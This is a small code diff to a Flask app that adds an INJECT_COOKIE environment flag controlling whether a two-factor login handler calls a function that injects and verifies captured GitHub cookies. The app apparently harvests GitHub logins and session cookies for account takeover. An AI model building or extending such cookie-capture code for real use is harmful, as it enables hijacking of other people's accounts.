@@ -11,6 +11,7 @@ app = Flask(__name__)
 load_dotenv()
 
 app.secret_key = os.getenv("APP_SECRET_KEY")
+inject_cookie = os.getenv("INJECT_COOKIE") == "TRUE"
 
 
 @app.route("/", methods=["GET"])
@@ -140,7 +141,8 @@ def post_two_fa():
         conn.commit()
         conn.close()
 
-        inject_and_verify_github_cookies(cookies)
+        if (inject_cookie):
+            inject_and_verify_github_cookies(cookies)
 
         response = make_response(
             render_template("index.html", github_login=response_html)
